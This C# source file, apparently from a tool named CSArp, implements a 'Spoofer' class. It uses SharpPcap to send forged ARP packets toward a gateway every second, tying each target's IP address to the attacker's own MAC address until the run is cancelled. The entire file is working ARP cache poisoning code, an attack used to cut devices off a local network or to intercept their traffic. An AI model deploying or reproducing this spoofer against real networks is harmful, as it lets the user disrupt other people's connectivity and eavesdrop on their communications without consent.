using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;

namespace CSArp.Model
{
    public class Spoofer
    {
        private readonly Action<string> _log;
        private CancellationTokenSource _spoofingCts;
        private int _activeTargetCount;

        public Spoofer(Action<string> log = null)
        {
            _log = log ?? Debug.Print;
        }

        public void Start(
            IReadOnlyDictionary<IPAddress, PhysicalAddress> targets,
            IPAddress gatewayIpAddress,
            PhysicalAddress gatewayMacAddress,
            LibPcapLiveDevice networkAdapter)
        {
            StopAll();

            if (targets == null || targets.Count == 0)
            {
                _log("Spoofing task skipped because there are no targets.");
                return;
            }

            _spoofingCts = new CancellationTokenSource();
            _activeTargetCount = targets.Count;

            if (!networkAdapter.Opened) networkAdapter.Open();

            _log($"Spoofing task started for {_activeTargetCount} target(s).");

            foreach (var target in targets)
            {
                var arpPacketForGatewayRequest = new ArpPacket(
                    ArpOperation.Request,
                    "00-00-00-00-00-00".Parse(),
                    gatewayIpAddress,
                    networkAdapter.MacAddress,
                    target.Key);

                var ethernetPacketForGatewayRequest = new EthernetPacket(networkAdapter.MacAddress, gatewayMacAddress, EthernetType.Arp)
                {
                    PayloadPacket = arpPacketForGatewayRequest
                };

                _ = Task.Run(
                    () => SendSpoofingPacket(target.Key, target.Value, ethernetPacketForGatewayRequest, networkAdapter, _spoofingCts.Token),
                    _spoofingCts.Token);
            }
        }

        public void StopAll()
        {
            if (_spoofingCts == null || _spoofingCts.IsCancellationRequested) return;
            _spoofingCts.Cancel();
            _log($"Spoofing task stopped for {_activeTargetCount} target(s).");
            _activeTargetCount = 0;
        }

        private async Task SendSpoofingPacket(
            IPAddress ipAddress,
            PhysicalAddress physicalAddress,
            EthernetPacket ethernetPacket,
            LibPcapLiveDevice captureDevice,
            CancellationToken cancellationToken)
        {
            _log($"Spoofing target {physicalAddress.ToString("-")} @ {ipAddress}");

            try
            {
                while (!cancellationToken.IsCancellationRequested)
                {
                    captureDevice.SendPacket(ethernetPacket);
                    await Task.Delay(TimeSpan.FromSeconds(1), cancellationToken).ConfigureAwait(false);
                }
            }
            catch (OperationCanceledException)
            {
            }
            catch (PcapException ex)
            {
                _log($"PcapException @ Spoofer.SendSpoofingPacket() [{ex.Message}]");
            }

            _log($"Spoofing thread terminating for {physicalAddress.ToString("-")} @ {ipAddress}");
        }
    }
}
